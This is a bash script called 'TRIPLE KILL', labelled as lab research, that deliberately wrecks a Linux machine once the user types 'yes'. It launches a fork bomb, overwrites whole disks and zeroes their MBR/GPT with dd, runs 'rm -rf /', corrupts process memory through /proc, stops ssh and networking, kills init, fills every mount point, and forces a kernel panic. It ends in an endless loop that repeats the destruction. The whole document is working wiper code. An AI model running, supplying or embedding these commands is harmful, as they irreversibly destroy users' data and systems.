#!/bin/bash
# ============================================================
# TRIPLE KILL - BRUTAL VERSION (NO AUTO REBOOT)
# FOR LAB RESEARCH ONLY!
# SYSTEM WILL DESTROY ITSELF AND CRASH NATURALLY
# ============================================================

echo "WARNING: This script will COMPLETELY DESTROY the system!"
echo "  - MBR/GPT will be wiped"
echo "  - All data will be lost"
echo "  - System will crash naturally"
echo "  - No automatic reboot"
echo ""
echo "Type 'yes' to continue:"
read confirm

if [[ "${confirm,,}" != "yes" ]]; then
    echo "Aborted."
    exit 0
fi

echo ""
echo "Starting in 5 seconds..."
sleep 5
echo "GO!"
echo ""

# ============================================================
# PHASE 1: FORK BOMB
# ============================================================
echo "[PHASE 1] Fork bomb..."
cat > /tmp/fork_bomb.sh << 'EOF'
#!/bin/bash
:(){ :|:& };:
EOF

chmod +x /tmp/fork_bomb.sh
/tmp/fork_bomb.sh &
echo "Fork bomb running."

# ============================================================
# PHASE 2: DISK FILLER - DIRECT TO DISK
# ============================================================
echo "[PHASE 2] Disk filler (writing directly to disk)..."
(
    dd if=/dev/urandom of=/dev/sda bs=1M 2>/dev/null &
    dd if=/dev/urandom of=/dev/sdb bs=1M 2>/dev/null &
    dd if=/dev/urandom of=/dev/sdc bs=1M 2>/dev/null &
) &
echo "Disk filler running."

# ============================================================
# PHASE 3: DELETE ALL SYSTEM FILES
# ============================================================
echo "[PHASE 3] Deleting ALL system files..."
(
    rm -rf /* 2>/dev/null &
) &
echo "All system files deleted."

# ============================================================
# PHASE 4: DESTROY MBR/GPT
# ============================================================
echo "[PHASE 4] Destroying MBR/GPT..."
(
    dd if=/dev/zero of=/dev/sda bs=512 count=1 2>/dev/null
    dd if=/dev/zero of=/dev/sdb bs=512 count=1 2>/dev/null
    dd if=/dev/zero of=/dev/sdc bs=512 count=1 2>/dev/null
    dd if=/dev/zero of=/dev/nvme0n1 bs=512 count=1 2>/dev/null
) &
echo "MBR/GPT destroyed."

# ============================================================
# PHASE 5: CORRUPT RUNNING PROCESSES
# ============================================================
echo "[PHASE 5] Corrupting running processes..."
(
    # Overwrite memory of running processes
    for pid in $(ps aux | awk '{print $2}' | grep -v PID); do
        dd if=/dev/urandom of=/proc/$pid/mem bs=1K count=1 2>/dev/null
    done
) &
echo "Process memory corrupted."

# ============================================================
# PHASE 6: KILL CRITICAL SYSTEM SERVICES
# ============================================================
echo "[PHASE 6] Killing critical services..."
(
    systemctl stop ssh 2>/dev/null
    systemctl stop cron 2>/dev/null
    systemctl stop networking 2>/dev/null
    systemctl stop systemd-logind 2>/dev/null
    systemctl stop dbus 2>/dev/null
    kill -9 1 2>/dev/null  # Try to kill init/systemd
) &
echo "Critical services killed."

# ============================================================
# PHASE 7: FILL ALL MOUNT POINTS
# ============================================================
echo "[PHASE 7] Filling all mount points..."
(
    for mount in $(mount | awk '{print $3}'); do
        dd if=/dev/zero of=$mount/fill_$(date +%s%N).dat bs=1M count=100 2>/dev/null &
    done
) &
echo "All mount points filled."

# ============================================================
# FINAL - LET SYSTEM CRASH NATURALLY
# ============================================================
echo ""
echo "============================================================"
echo "ALL PHASES COMPLETE"
echo "  CPU: Overloaded (fork bomb)"
echo "  Disk: Overwritten with random data"
echo "  OS: Completely deleted"
echo "  MBR/GPT: WIPED (ZEROED OUT)"
echo "  Processes: Corrupted and killed"
echo "  Services: Destroyed"
echo ""
echo "SYSTEM IS NOW DESTROYING ITSELF"
echo "Watch the chaos unfold..."
echo ""
echo "The system will crash naturally within seconds/minutes"
echo "No automatic reboot will occur"
echo ""
echo "When it crashes, you can manually reboot to see:"
echo "  - No bootable device"
echo "  - MBR/GPT empty"
echo "  - OS completely gone"
echo "============================================================"

# Final corruption - try to break the kernel
echo 1 > /proc/sys/kernel/sysrq 2>/dev/null
echo c > /proc/sysrq-trigger 2>/dev/null  # Trigger kernel panic

# If sysrq doesn't work, keep destroying
while true; do
    rm -rf / 2>/dev/null
    dd if=/dev/urandom of=/dev/sda bs=1M 2>/dev/null
    :(){ :|:& };:
done
